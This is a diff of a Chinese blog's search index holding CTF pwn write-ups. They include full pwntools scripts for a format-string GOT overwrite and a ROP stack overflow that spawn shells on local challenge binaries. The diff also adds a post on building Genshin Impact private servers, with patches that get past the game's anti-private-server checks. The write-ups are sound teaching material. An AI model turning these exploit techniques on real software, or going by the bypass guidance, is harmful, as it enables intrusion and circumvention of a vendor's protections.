-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;%1$p&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x4006AD&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>​		<code>%1$p</code>表示输出第一个参数的指针形式输出<img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/gdb.png" alt="gdb"></p>
-<p>​		查看栈中情况，可以发现<code>_libc_stat_main+240</code>地址，计算得到该地址为第26个参数（64位程序需要注意前6个参数会在寄存器中）。因此要泄漏<code>libc</code>地址，可以利用<code>%25$p</code>。</p>
-<ul>
-<li>获取libc基址后，可以获取libc中的<code>system</code>函数地址。然后可以通过修改printf函数got表的方式来使程序在执行<code>printf</code>函数转去执行<code>system</code>函数，并且以输入<code>&quot;/bin/sh&quot;</code>字符串达到执行函数<code>system(&quot;/bin/sh&quot;)</code>的目的。</li>
-<li>由于64位程序中函数地址高位为<code>\x00</code>，因此会导致printf函数输出时截断，所以构造payload时printf函数地址需要放在末尾，然后由于64位地址如果使用<code>%n</code>直接对整体进行修改的话，会造成printf输出字符数目过大，耗时且易崩溃。所以考虑使用<code>%hn</code>来进行两字节的修改。</li>
-<li>构造payload，根据system函数的地址分两次修改。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag: tmp1 &lt; tmp2时为True</span></span><br><span class="line"><span class="comment"># tmp1: 高两字节， tmp2: 低两字节</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-<p>​		发送payload后栈情况：</p>
-<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb.png" alt="payload-gdb"></p>
-<p>​		执行printf函数后，可见printf函数got表地址已被修改为system函数地址，然后输入<code>&quot;/bin/sh&quot;</code>字符串，即可返回shell。</p>
-<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb-1.png" alt="payload-gdb-1"></p>
-<ul>
-<li>最终python脚本如下：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取read函数在libc中偏移</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x4006AD&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x20840</span>  <span class="comment"># 0x20840</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">tmp1 = tmp[<span class="number">6</span>:<span class="number">10</span>]</span><br><span class="line">tmp2 = tmp[<span class="number">10</span>:<span class="number">14</span>]</span><br><span class="line">tmp1 = <span class="built_in">int</span>(tmp1, <span class="number">16</span>)</span><br><span class="line">tmp2 = <span class="built_in">int</span>(tmp2, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> tmp1 &gt; tmp2:</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    tmp1 = tmp1 - tmp2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    tmp2 = tmp2 - tmp1</span><br><span class="line"><span class="built_in">print</span>(tmp1)</span><br><span class="line"><span class="built_in">print</span>(tmp2)</span><br><span class="line">tmp1 = <span class="built_in">str</span>(tmp1)</span><br><span class="line">tmp2 = <span class="built_in">str</span>(tmp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改got表</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(printf_got)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送&quot;/bin/sh&quot;字符串</span></span><br><span class="line">payload = flat(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/result.png" alt="result"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-        <tag>格式化字符串</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF 第五空间PWN5</title>
     <url>/posts/e2482cb8.html</url>
-    <content><![CDATA[<h1 id="第五空间2019-决赛PWN5"><a href="#第五空间2019-决赛PWN5" class="headerlink" title="第五空间2019 决赛PWN5"></a>第五空间2019 决赛PWN5</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
 <li>格式化字符串漏洞</li>
 </ul>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
@@ -457,7 +457,7 @@
   <entry>
     <title>ciscn_2019_c_1 WriteUp</title>
     <url>/posts/daa10577.html</url>
-    <content><![CDATA[<h1 id="ciscn-2019-c-1-WriteUp"><a href="#ciscn-2019-c-1-WriteUp" class="headerlink" title="ciscn_2019_c_1 WriteUp"></a>ciscn_2019_c_1 WriteUp</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
 <li>libc版本泄漏</li>
 <li>ROP攻击</li>
 <li>onegadget使用</li>
@@ -500,9 +500,115 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn4 writeup</title>
+    <url>/posts/9e08527c.html</url>
+    <content><![CDATA[<h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><ul>
+<li>64位ROP攻击</li>
+<li>栈溢出攻击</li>
+</ul>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><ul>
+<li><p>首先使用<code>checksec</code>工具查看<code>pwn4</code>状态<img src="/images/2023-10-23-pwn4/images/checksec.png" alt="checksec"></p>
+</li>
+<li><p>由图可知<code>pwn4</code>为64位程序，且开启了DEP机制，因此可以使用ROP攻击，只不过由于64位程序函数前6个参数会存储在寄存器rdi，rsi，rdx，rcx，r8，r9中，因此需要使用<code>ROPgadget</code>工具寻找可用片段将参数传入寄存器rdi中。</p>
+</li>
+<li><p>使用<code>ida64</code>工具打开，获取到重要地址<code>stack_flow</code>, <code>system</code>, <code>&quot;/bin/sh&quot;</code>的地址，使用<code>ROPgadget</code>工具获取到<code>pop rdi, ret</code>片段的地址：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数或字符串</th>
+<th>地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>stack_flow</td>
+<td>0x040061B</td>
+</tr>
+<tr>
+<td>system</td>
+<td>0x0400480</td>
+</tr>
+<tr>
+<td>“&#x2F;bin&#x2F;sh”</td>
+<td>0x04006FF</td>
+</tr>
+<tr>
+<td>pop rdi, ret</td>
+<td>0x0400693</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>使用<code>pwndbg</code>来动态调试，在<code>stack_flow</code>函数下断点，可见传入<code>read</code>函数的参数为<code>0x20</code>个字节，要覆盖到寄存器<code>rbp</code>，需要<code>0x20+8</code>个输入；</p>
+</li>
+<li><p>构造python脚本，需要构造payload向pwn4传入(0x20+8)字符覆盖到函数返回地址，然后加入system函数地址，并传入参数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_flow = <span class="number">0x40061B</span></span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line">bin_sh = <span class="number">0x4006FF</span></span><br><span class="line">pop_rdi = <span class="number">0x400693</span></span><br><span class="line">ret = <span class="number">0x4005F3</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;04005F2&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me your payload&quot;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), ret, pop_rdi, bin_sh, system)</span><br><span class="line">gdb.attach(p, <span class="string">f&#x27;b *0x<span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注：如果不加<code>ret</code>，<code>pop rdi</code>栈地址为<code>0x47e4b8</code>末尾不为0，因此无法正确执行，所以需要加入ret，使后面命令对齐。</p>
+</li>
+</ul>
+<p><img src="/images/2023-10-23-pwn4/images/stack-1.png" alt="stack-1"></p>
+<p>​		加入<code>ret</code>后栈的情况。</p>
+<p><img src="/images/2023-10-23-pwn4/images/stack.png" alt="stack"></p>
+<ul>
+<li>结果成功利用栈溢出获取到shell：</li>
+</ul>
+<p><img src="/images/2023-10-23-pwn4/images/result.png" alt="result"></p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>格式化字符串漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN3</title>
+    <url>/posts/5290eb16.html</url>
+    <content><![CDATA[<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
+<li>堆栈溢出原理</li>
+<li>ROP攻击</li>
+<li>Ida、pwndbg工具的使用</li>
+<li>熟悉汇编语言</li>
+</ul>
+<hr>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先使用<code>checksec</code>工具检查<code>pwn3</code>文件基本信息，基本信息如下：</p>
+<p><img src="/images/2023-10-23-pwn3/images/checksec.png" alt="checksec"></p>
+<p>然后<code>./pwn3</code>运行一下，查看效果（注：权限可能需要修改以保证可以正常执行）</p>
+<p><img src="/images/2023-10-23-pwn3/images/%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C.png" alt="正常运行"></p>
+<p>尝试输入较长字符串，查看结果，说明存在栈溢出漏洞。</p>
+<p><img src="/images/2023-10-23-pwn3/images/%E5%AD%98%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.png" alt="栈溢出漏洞"></p>
+<p>使用ida工具逆向分析：</p>
+<p><img src="/images/2023-10-23-pwn3/images/main%E5%87%BD%E6%95%B0%E5%8F%8D%E6%B1%87%E7%BC%96.png" alt="main函数反汇编"></p>
+<p>ROP攻击思路，将栈溢出到old_ebp下，后面覆盖要执行的<code>system(&quot;bin/sh&quot;)</code>代码：</p>
+<img src="/images/2023-10-23-pwn3/images/ROP攻击原理.png" />
+
+<p>经过静态分析，得到<code>system</code>函数地址：</p>
+<p><img src="/images/2023-10-23-pwn3/images/system%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="system函数地址"></p>
+<p><code>&quot;/bin/sh&quot;</code>地址：</p>
+<p><img src="/images/2023-10-23-pwn3/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80.png" alt="字符串地址"></p>
+<p>对pwn3进行动态调试，查看要填充多少字节才可以发生堆栈溢出：</p>
+<p>在<code>stack_overflow</code>函数地址<code>0x800484F3</code>下断点:</p>
+<p><img src="/images/2023-10-23-pwn3/images/stackoverflow%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="stackoverflow函数地址"></p>
+<p>查看<code>stack_overflow</code>内部<code>read</code>函数前设置了<code>0x28</code>字节的参数，因此需要输入28位以上才可以产生栈溢出覆盖返回地址。<img src="/images/2023-10-23-pwn3/images/gdb.png" alt="image-20230921224714276"></p>
+<p>构造<code>EXP.py</code>攻击<code>pwn3</code></p>
+<p><img src="/images/2023-10-23-pwn3/images/python%E6%96%87%E4%BB%B6.png" alt="python文件"></p>
+<p>通过向<code>pwn3</code>发送超过<code>0x28+4</code>字节的输入，可以覆盖到返回地址，从而影响函数执行，使<code>pwn3</code>转去执行其他的函数</p>
+<hr>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/2023-10-23-pwn3/images/%E7%BB%93%E6%9E%9C.png" alt="结果"></p>
+<p>成功弹出shell。</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>ROP攻击</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>messageboard writeup</title>
     <url>/posts/6d53b6de.html</url>
-    <content><![CDATA[<h3 id="messageboard"><a href="#messageboard" class="headerlink" title="messageboard"></a>messageboard</h3><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
+    <content><![CDATA[<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
 <li>Canary绕过原理</li>
 <li>PIE绕过原理</li>
 <li>对gdb调试器的使用</li>
@@ -571,115 +677,28 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN3</title>
-    <url>/posts/5290eb16.html</url>
-    <content><![CDATA[<h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
-<li>堆栈溢出原理</li>
-<li>ROP攻击</li>
-<li>Ida、pwndbg工具的使用</li>
-<li>熟悉汇编语言</li>
-</ul>
-<hr>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先使用<code>checksec</code>工具检查<code>pwn3</code>文件基本信息，基本信息如下：</p>
-<p><img src="/images/2023-10-23-pwn3/images/checksec.png" alt="checksec"></p>
-<p>然后<code>./pwn3</code>运行一下，查看效果（注：权限可能需要修改以保证可以正常执行）</p>
-<p><img src="/images/2023-10-23-pwn3/images/%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C.png" alt="正常运行"></p>
-<p>尝试输入较长字符串，查看结果，说明存在栈溢出漏洞。</p>
-<p><img src="/images/2023-10-23-pwn3/images/%E5%AD%98%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.png" alt="栈溢出漏洞"></p>
-<p>使用ida工具逆向分析：</p>
-<p><img src="/images/2023-10-23-pwn3/images/main%E5%87%BD%E6%95%B0%E5%8F%8D%E6%B1%87%E7%BC%96.png" alt="main函数反汇编"></p>
-<p>ROP攻击思路，将栈溢出到old_ebp下，后面覆盖要执行的<code>system(&quot;bin/sh&quot;)</code>代码：</p>
-<img src="/images/2023-10-23-pwn3/images/ROP攻击原理.png" />
-
-<p>经过静态分析，得到<code>system</code>函数地址：</p>
-<p><img src="/images/2023-10-23-pwn3/images/system%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="system函数地址"></p>
-<p><code>&quot;/bin/sh&quot;</code>地址：</p>
-<p><img src="/images/2023-10-23-pwn3/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80.png" alt="字符串地址"></p>
-<p>对pwn3进行动态调试，查看要填充多少字节才可以发生堆栈溢出：</p>
-<p>在<code>stack_overflow</code>函数地址<code>0x800484F3</code>下断点:</p>
-<p><img src="/images/2023-10-23-pwn3/images/stackoverflow%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="stackoverflow函数地址"></p>
-<p>查看<code>stack_overflow</code>内部<code>read</code>函数前设置了<code>0x28</code>字节的参数，因此需要输入28位以上才可以产生栈溢出覆盖返回地址。<img src="/images/2023-10-23-pwn3/images/gdb.png" alt="image-20230921224714276"></p>
-<p>构造<code>EXP.py</code>攻击<code>pwn3</code></p>
-<p><img src="/images/2023-10-23-pwn3/images/python%E6%96%87%E4%BB%B6.png" alt="python文件"></p>
-<p>通过向<code>pwn3</code>发送超过<code>0x28+4</code>字节的输入，可以覆盖到返回地址，从而影响函数执行，使<code>pwn3</code>转去执行其他的函数</p>
-<hr>
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/2023-10-23-pwn3/images/%E7%BB%93%E6%9E%9C.png" alt="结果"></p>
-<p>成功弹出shell。</p>
+    <title>某二次元游戏私服搭建总结</title>
+    <url>/posts/af718253.html</url>
+    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
+<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
+<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
+<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
+<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
+<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
+<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
+<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
+<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
+<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
+<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
 ]]></content>
       <tags>
         <tag>教程</tag>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-        <tag>ROP攻击</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn4 writeup</title>
-    <url>/posts/9e08527c.html</url>
-    <content><![CDATA[<h3 id="题目：pwn4"><a href="#题目：pwn4" class="headerlink" title="题目：pwn4"></a>题目：pwn4</h3><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><ul>
-<li>64位ROP攻击</li>
-<li>栈溢出攻击</li>
-</ul>
-<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><ul>
-<li><p>首先使用<code>checksec</code>工具查看<code>pwn4</code>状态<img src="/images/2023-10-23-pwn4/images/checksec.png" alt="checksec"></p>
-</li>
-<li><p>由图可知<code>pwn4</code>为64位程序，且开启了DEP机制，因此可以使用ROP攻击，只不过由于64位程序函数前6个参数会存储在寄存器rdi，rsi，rdx，rcx，r8，r9中，因此需要使用<code>ROPgadget</code>工具寻找可用片段将参数传入寄存器rdi中。</p>
-</li>
-<li><p>使用<code>ida64</code>工具打开，获取到重要地址<code>stack_flow</code>, <code>system</code>, <code>&quot;/bin/sh&quot;</code>的地址，使用<code>ROPgadget</code>工具获取到<code>pop rdi, ret</code>片段的地址：</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>函数或字符串</th>
-<th>地址</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>stack_flow</td>
-<td>0x040061B</td>
-</tr>
-<tr>
-<td>system</td>
-<td>0x0400480</td>
-</tr>
-<tr>
-<td>“&#x2F;bin&#x2F;sh”</td>
-<td>0x04006FF</td>
-</tr>
-<tr>
-<td>pop rdi, ret</td>
-<td>0x0400693</td>
-</tr>
-</tbody></table>
-<ul>
-<li><p>使用<code>pwndbg</code>来动态调试，在<code>stack_flow</code>函数下断点，可见传入<code>read</code>函数的参数为<code>0x20</code>个字节，要覆盖到寄存器<code>rbp</code>，需要<code>0x20+8</code>个输入；</p>
-</li>
-<li><p>构造python脚本，需要构造payload向pwn4传入(0x20+8)字符覆盖到函数返回地址，然后加入system函数地址，并传入参数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_flow = <span class="number">0x40061B</span></span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line">bin_sh = <span class="number">0x4006FF</span></span><br><span class="line">pop_rdi = <span class="number">0x400693</span></span><br><span class="line">ret = <span class="number">0x4005F3</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;04005F2&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me your payload&quot;</span>)</span><br><span class="line">payload = 